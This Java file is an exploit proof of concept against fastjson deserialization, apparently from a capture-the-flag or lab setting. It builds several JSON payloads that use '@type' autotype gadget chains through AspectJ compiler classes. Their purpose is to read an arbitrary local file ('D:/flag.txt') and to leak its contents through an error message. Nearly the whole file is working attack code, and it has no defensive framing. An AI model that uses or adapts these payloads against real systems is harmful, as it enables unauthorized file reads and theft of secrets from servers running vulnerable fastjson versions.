package vul;

import com.alibaba.fastjson.JSON;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class AspectjAttack {
    public static void main(String[] args) throws IOException {
        read();
    }

    public static void read() throws IOException {
        String poc1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
                "}";

        String poc2 = "{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":{\n" +
                "        \"@type\":\"java.lang.String\"{\n" +
                "        \"@type\":\"java.util.Locale\",\n" +
                "        \"val\":{\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "             {\n" +
                "                \"@type\":\"java.lang.String\"\n" +
                "                \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
                "                \"newAnnotationProcessorUnits\":[{}]\n" +
                "            }\n" +
                "        }\n" +
                "    }";

        String poc3 = "{\n" +
                "    \"x\":{\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "        \"fileName\":\"D:/flag.txt\"\n" +
                "    }\n" +
                "}";

        JSON.parse(poc1);
        try {
            JSON.parse(poc2);
        }catch (Exception e){

        }
        System.out.println(JSON.parse(poc3));

        //报错回显
        poc3 = "{\r\n"
                + "	\"@type\": \"java.lang.Character\" {\r\n"
                + "		\"C\": {\r\n"
                + "			\"x\": {\r\n"
                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
                + "				\"fileName\": \"D:/flag.txt\"\r\n"
                + "			}\r\n"
                + "		}\r\n"
                + "	}\r\n"
                + "}";

        JSON.parse(poc3);

    }
}
